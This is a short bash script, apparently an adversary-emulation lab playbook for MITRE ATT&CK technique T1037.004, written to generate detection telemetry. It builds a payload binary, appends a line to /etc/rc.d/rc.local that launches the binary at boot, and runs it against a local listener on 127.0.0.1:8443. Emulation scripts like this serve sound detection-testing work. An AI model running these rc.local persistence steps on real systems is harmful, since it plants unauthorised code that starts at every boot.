#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# T1037.004：rc.local 追加 + 载荷执行
"$HERE/common/build.sh" payload.elf
RC=/etc/rc.d/rc.local; [ -f "$RC" ] || { echo '#!/bin/bash' > "$RC"; }
grep -q secval "$RC" || echo "$PWD/payload.elf 127.0.0.1 8443" >> "$RC"
chmod +x "$RC"
"$HERE/common/with_listener.sh" 8443 ./payload.elf 127.0.0.1 8443
